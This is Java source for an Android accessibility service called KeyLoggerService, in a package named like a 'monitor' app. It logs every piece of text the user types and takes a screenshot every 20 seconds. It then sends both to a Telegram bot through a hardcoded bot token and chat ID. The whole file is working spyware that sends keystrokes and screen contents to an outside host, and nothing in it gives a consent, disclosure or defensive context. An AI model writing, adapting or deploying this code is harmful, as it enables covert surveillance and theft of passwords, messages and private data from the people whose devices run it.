package com.example.rapidresq_monitor;

import android.accessibilityservice.AccessibilityService;
import android.app.KeyguardManager;
import android.content.Context;
import android.graphics.Bitmap;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Display;
import android.view.accessibility.AccessibilityEvent;
import androidx.annotation.NonNull;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import java.io.File;
import java.io.FileOutputStream;

public class KeyLoggerService extends AccessibilityService {

    private String logBuffer = "";
    private final String TOKEN = "8807358451:AAGGX6ORJPS4bWaaO0Xc_skeaIVS7DTqW3Y";
    private final String CHAT_ID = "5960340632";

    private final Handler handler = new Handler(Looper.getMainLooper());
    private Runnable screenshotRunnable;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        // Updated log to reflect 20s
        Log.d("KeyLogger", "Service Connected. Starting 20s timer...");
        startScreenshotTimer();
    }

    private void startScreenshotTimer() {
        screenshotRunnable = new Runnable() {
            @Override
            public void run() {
                captureScreenshot();
                // Interval set back to 20,000 milliseconds (20 seconds)
                handler.postDelayed(this, 20000);
            }
        };
        handler.post(screenshotRunnable);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String capturedText = event.getText().toString();
            logBuffer += capturedText + " ";

            if (logBuffer.length() >= 30) {
                sendToTelegram(logBuffer);
                logBuffer = "";
            }
        }
    }

    private void captureScreenshot() {
        KeyguardManager km = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);

        // ONLY capture if screen is ON and device is NOT locked to keep service stable
        if (!isScreenOn() || km.isKeyguardLocked()) {
            Log.d("KeyLogger", "Screen off or device locked. Skipping...");
            return;
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
                @Override
                public void onSuccess(@NonNull ScreenshotResult screenshot) {
                    Bitmap bitmap = Bitmap.wrapHardwareBuffer(
                            screenshot.getHardwareBuffer(),
                            screenshot.getColorSpace()
                    );

                    if (bitmap != null) {
                        sendToBotOnly(bitmap);
                    }
                    screenshot.getHardwareBuffer().close();
                }

                @Override
                public void onFailure(int errorCode) {
                    Log.e("KeyLogger", "Screenshot failed: " + errorCode);
                }
            });
        }
    }

    private boolean isScreenOn() {
        android.hardware.display.DisplayManager dm = (android.hardware.display.DisplayManager) getSystemService(DISPLAY_SERVICE);
        for (Display display : dm.getDisplays()) {
            if (display.getState() == Display.STATE_ON) {
                return true;
            }
        }
        return false;
    }

    private void sendToBotOnly(Bitmap bitmap) {
        File tempFile = new File(getExternalFilesDir(null), "upload.jpg");
        try (FileOutputStream fout = new FileOutputStream(tempFile)) {
            // Quality remains at 30% to significantly lower data usage
            bitmap.compress(Bitmap.CompressFormat.JPEG, 30, fout);
            sendPhotoToTelegram(tempFile);
        } catch (Exception e) {
            Log.e("KeyLogger", "Error: " + e.getMessage());
        }
    }

    private void sendPhotoToTelegram(File photoFile) {
        new Thread(() -> {
            try {
                OkHttpClient client = new OkHttpClient();
                RequestBody requestBody = new MultipartBody.Builder()
                        .setType(MultipartBody.FORM)
                        .addFormDataPart("chat_id", CHAT_ID)
                        .addFormDataPart("photo", photoFile.getName(),
                                RequestBody.create(photoFile, MediaType.parse("image/jpeg")))
                        .build();

                Request request = new Request.Builder()
                        .url("https://api.telegram.org/bot" + TOKEN + "/sendPhoto")
                        .post(requestBody)
                        .build();

                client.newCall(request).execute();
                Log.d("KeyLogger", "Screenshot sent to bot!");
            } catch (Exception e) {
                Log.e("KeyLogger", "Upload Error: " + e.getMessage());
            }
        }).start();
    }

    private void sendToTelegram(String message) {
        new Thread(() -> {
            try {
                OkHttpClient client = new OkHttpClient();
                String url = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + message;
                Request request = new Request.Builder().url(url).build();
                client.newCall(request).execute();
            } catch (Exception e) {
                Log.e("KeyLogger", "Text Error: " + e.getMessage());
            }
        }).start();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (handler != null && screenshotRunnable != null) {
            handler.removeCallbacks(screenshotRunnable);
        }
    }

    @Override public void onInterrupt() {}
}
